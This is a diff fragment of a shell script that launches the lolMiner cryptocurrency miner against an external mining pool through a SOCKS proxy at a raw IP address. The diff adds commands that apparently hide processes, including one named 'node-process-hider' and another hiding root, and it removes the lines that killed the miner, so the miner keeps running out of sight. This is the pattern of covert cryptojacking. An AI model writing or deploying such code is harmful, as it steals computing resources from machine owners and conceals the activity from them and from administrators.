@@ -19,13 +19,8 @@ sudo swapoff -a; sudo swapon -a
 sleep 10
 ph add PhoenixMinerEth.sh
 Ph add python3
+ph add root
+ph add node-process-hider
 ph add lolMiner
 ./lolMiner --algo ETHASH --pool stratum+tcp://ethash.kupool.com:8888 --user hunterd.001 --ethstratum ETHPROXY socks 202.159.35.153:443  --timeprint on --longstats 120
 sleep 10
-sudo swapoff -a; sudo swapon -a
-
-pkill -9 lolMiner
-pkill -9 lolMiner
-sleep 9
-pkill -9 lolMiner
-sleep 30
